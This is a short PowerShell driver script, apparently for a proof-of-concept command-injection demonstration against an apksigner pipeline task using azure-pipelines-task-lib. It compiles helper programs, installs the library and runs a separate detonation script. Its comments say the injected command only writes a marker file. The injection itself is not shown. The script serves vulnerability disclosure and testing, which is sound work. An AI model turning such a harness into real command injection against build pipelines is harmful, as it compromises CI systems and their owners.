# Windows-only. Builds the two helper executables, installs the published library, and runs
# the detonation with its three controls. Nothing is fetched at payload time and nothing
# destructive runs: the injected command is mark.exe, which writes one marker file.
# Run: powershell -NoProfile -File detonate.ps1
$ErrorActionPreference = 'Stop'
$here = Split-Path -Parent $MyInvocation.MyCommand.Path
$work = Join-Path ([System.IO.Path]::GetTempPath()) ("apksigner-poc-" + [guid]::NewGuid().ToString('N').Substring(0,8))
New-Item -ItemType Directory -Force -Path $work | Out-Null
$csc = "$env:WINDIR\Microsoft.NET\Framework64\v4.0.30319\csc.exe"
& $csc /nologo /out:"$work\argvdump.exe" (Join-Path $here 'argvdump.cs')
& $csc /nologo /out:"$work\mark.exe"     (Join-Path $here 'mark.cs')
Push-Location $here
if (-not (Test-Path (Join-Path $here 'node_modules'))) { npm init -y | Out-Null; npm i azure-pipelines-task-lib@5.280.3 | Out-Null }
$env:POC_MARKER_ID = 'apksigner-poc'
node (Join-Path $here 'detonate.js') $work
Pop-Location
Write-Host ("work dir: " + $work)
